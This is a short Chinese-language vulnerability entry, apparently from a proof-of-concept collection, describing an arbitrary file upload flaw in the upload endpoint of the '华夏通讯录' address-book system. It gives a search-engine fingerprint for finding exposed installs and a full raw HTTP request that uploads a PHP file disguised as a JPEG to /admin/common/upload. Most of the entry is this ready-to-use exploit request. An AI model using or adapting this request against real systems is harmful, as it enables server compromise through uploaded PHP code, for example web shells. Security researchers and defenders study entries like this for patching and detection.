# 华夏通讯录存在前台upload任意文件上传漏洞

- **系统**：华夏通讯录　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="1403225079"`
- **请求**：`POST /admin/common/upload HTTP/1.1`

**请求体 / payload**
```
默认后台 /admin
Content-Length: 197
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIGQdzBsWlq43t3JA
Cookie: PHPSESSID=719psss6jnv9112q6spakfmt32; md5=201920; visitor_source=http%3A%2F%2F127.0.0.1%3A81%2Findex
Host: 127.0.0.1:81
sec-fetch-user: ?1
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```
- **预期**：200　|　—